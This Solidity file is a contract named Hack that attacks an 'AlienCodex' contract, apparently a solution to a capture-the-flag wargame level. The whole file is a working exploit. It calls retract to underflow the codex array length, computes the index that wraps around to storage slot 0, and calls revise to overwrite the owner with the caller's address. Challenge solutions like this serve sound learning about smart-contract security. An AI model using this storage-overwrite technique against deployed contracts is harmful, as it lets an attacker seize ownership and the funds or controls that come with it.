// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

interface IAlienCodex {
    function owner() external view returns (address);
    function makeContact() external;
    function retract() external; // Add retract function to the interface
    function revise(uint256 i, bytes32 _content) external;
}

contract Hack {
    constructor(IAlienCodex target) public {
        // Make contact with the target contract
        target.makeContact();
        
        // Call the retract function to manipulate the codex array size
        target.retract();

        // Calculate the index for owner overwrite (underflow to reach the storage slot 0)
        uint256 h = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 i = ~h + 1;

        // Overwrite the owner with msg.sender by casting the address to bytes32
        target.revise(i, bytes32(uint256(uint160(msg.sender))));

        // Ensure that the hack was successful by checking ownership
        require(target.owner() == msg.sender, "hack failed");
    }
}



